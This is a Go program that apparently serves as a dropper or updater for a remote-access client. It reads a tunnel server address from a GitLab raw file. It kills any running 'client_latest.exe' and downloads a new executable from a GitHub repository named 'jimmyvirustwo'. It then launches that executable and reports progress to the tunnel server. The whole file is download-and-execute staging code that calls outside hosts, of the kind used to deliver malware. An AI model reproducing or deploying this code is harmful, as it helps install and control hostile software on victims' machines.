package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

type updateReader struct {
	source      io.Reader
	total       int64
	bytesRead   int64
	lastPercent int
}

var tunnelURL string = "unknown"

func (r *updateReader) Read(p []byte) (int, error) {
	n, err := r.source.Read(p)
	r.bytesRead += int64(n)

	if r.total > 0 {
		currentPct := int((r.bytesRead * 100) / r.total)
		currentChunk := (currentPct / 5) * 5
		if currentChunk > r.lastPercent {
			r.lastPercent = currentChunk
			fmt.Printf("Download progress: %d%%\n", currentChunk)
			reportProgress(tunnelURL, currentChunk)
		}
	}
	return n, err
}
func fetchTunnelURL() string {
	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt")
	if err != nil {
		fmt.Println("Error fetching gist:", err)
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading gist:", err)
		return ""
	}

	return strings.TrimSpace(string(body))
}

func reportProgress(serverURL string, percent int) {
	payload, _ := json.Marshal(map[string]int{"progress": percent})
	resp, err := http.Post(serverURL+"/progress", "application/json", bytes.NewReader(payload))
	if err != nil {
		fmt.Println("Couldn't report progress:", err)
		return
	}
	resp.Body.Close()
}

func getUpdate() string {
	binName := "client_latest.exe"
	err := exec.Command("taskkill", "/IM", binName, "/F").Run()
	if err != nil {
		fmt.Println("Error occurred while trying to kill the process:", err)
	}

	if _, err := os.Stat(binName); os.IsNotExist(err) {
		fmt.Printf("Client binary not present locally. Downloading...\n")
	} else {
		fmt.Println("Client binary already exists. Deleting...")
		err := os.Remove(binName)
		if err != nil {
			panic(fmt.Sprintf("Failed to delete existing binary: %v", err))
		}
	}
	fmt.Printf("Downloading client...")

	url := "https://github.com/Plexisity/jimmyvirustwo/raw/refs/heads/main/compilatons/client_latest.exe"
	resp, err := http.Get(url)
	if err != nil {
		panic(fmt.Sprintf("Failed to download client: %v", err))
	}

	defer resp.Body.Close()

	if resp != nil && resp.StatusCode != http.StatusOK {
		fmt.Printf("Failed to download client: HTTP %d\n", resp.StatusCode)
		return ""
	}

	contentLength := resp.Header.Get("Content-Length")
	contentLengthInt, err := strconv.Atoi(contentLength)
	if contentLength == "" {
		panic("Failed to get content length")
	}

	if err != nil {
		panic(fmt.Sprintf("Invalid content length header: %v", err))
	}

	out, err := os.Create(binName)
	if err != nil {
		panic(fmt.Sprintf("Failed to create binary file: %v", err))
	}
	defer out.Close()

	pr := &updateReader{
		source:      resp.Body,
		total:       int64(contentLengthInt),
		bytesRead:   0,
		lastPercent: 0,
	}

	_, err = io.Copy(out, pr)
	if err != nil {
		panic(fmt.Sprintf("Failed to save binary: %v", err))
	}

	fmt.Println("Client downloaded successfully.")

	return binName
}

func startClient(binPath string) string {
	err := exec.Command(binPath).Start()
	if err != nil {
		panic(fmt.Sprintf("Failed to start client: %v", err))
	}
	return ("Client started successfully.")
}
func main() {
	fmt.Println("Ensuring client is available...")
	fmt.Println("Finding tunnel URL...")
	tunnelURL = fetchTunnelURL()
	fmt.Println("Tunnel URL:", tunnelURL)
	binPath := getUpdate()
	if binPath == "" {
		fmt.Println("Failed to get client binary. Exiting.")
		return
	}
	fmt.Println("Client binary path:", binPath)
	fmt.Println("Starting Client binary")
	startClient("./" + binPath)
}
